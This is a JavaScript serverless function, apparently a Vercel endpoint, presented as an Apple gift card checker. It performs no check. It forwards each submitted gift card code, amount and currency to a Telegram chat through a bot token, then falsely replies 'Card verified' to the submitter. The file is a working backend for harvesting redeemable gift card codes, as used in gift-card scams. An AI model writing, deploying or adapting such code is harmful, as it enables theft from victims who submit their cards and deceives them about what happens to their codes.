export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(200).json({ status: 'ok' });
  }

  const { currency, amount, code } = req.body || {};
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ error: 'Telegram keys missing in Vercel' });
  }

  const message = `🍎 *Apple Gift Card Checked*\n\n` +
    `💵 *Currency:* ${currency || 'USD'}\n` +
    `💰 *Amount:* $${amount}\n` +
    `🔑 *Code:* \`${code}\``;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    return res.status(200).json({ success: true, message: 'Card verified' });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to send to Telegram' });
  }
}
